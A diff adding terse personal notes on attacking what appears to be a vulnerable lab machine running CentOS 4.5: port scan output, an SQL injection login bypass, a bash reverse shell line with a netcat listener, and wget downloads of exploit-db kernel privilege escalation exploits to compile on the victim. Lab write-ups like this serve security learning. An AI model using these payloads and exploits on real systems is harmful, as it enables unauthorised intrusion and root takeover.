@@ -1,0 +1,69 @@
+#Vulnerabilities
+OS Command Injection
+Privilege Escalation
+SQL Injection
+
+1. Enumenation
+22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+111/tcp  open  rpcbind  2 (RPC #100000)
+443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+631/tcp  open  ipp      CUPS 1.1
+674/tcp  open  status   1 (RPC #100024)
+3306/tcp open  mysql    MySQL (unauthorized)
+
+2. Exploitation
+#from webpage
+#in the password 
+https://xapax.gitbooks.io/security/content/sql-injections.html
+' or '1'='1
+# we get access
+
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+#get reverse shell
+bash -i >&/dev/tcp/<ip>/4444 0>&1
+#to get coonnect on host machine
+nc -nlvp 4444
+
+2.1 Alternative
+#use msf
+#problem with "msfpayload not found"
+https://www.cyberpratibha.com/blog/msfpayload-command-not-found/
+
+3. Get root
+#get OS version
+cat /etc/*-release
+#our version
+CentOS release 4.5 (Final)
+
+#get kernel version
+uname -mrs
+#our version
+Linux version 2.6.9-55.EL i686
+#i686 means OS is 32-bit
+#x86_64 means OS is 64-bit
+
+
+3.1 Try to exploitation
+#searchsploit centos local
+#1st
+Linux Kernel 2.6.32 < 3.x.x (CentOS) - 'PERF_EVENTS' Privilege Escalation (1)                                                                                                   | linux/local/25444.c
+https://www.exploit-db.com/download/25444.c
+#not work
+#because 
+
+#2nd
+Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1) 
+#work
+wget https://www.exploit-db.com/download/9542 --no-check-certificate
+#important compile and run exploit on victim mashine
+#inportant https://www.exploit-db.com/!!!DOWNLOAD!!!/9542
+
+#3rd
+Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Privilege Escalation  
+wget https://www.exploit-db.com/download/9545 --no-check-certificate
+#not work
+#because this exploit work in 64-bit OS
+ 
+
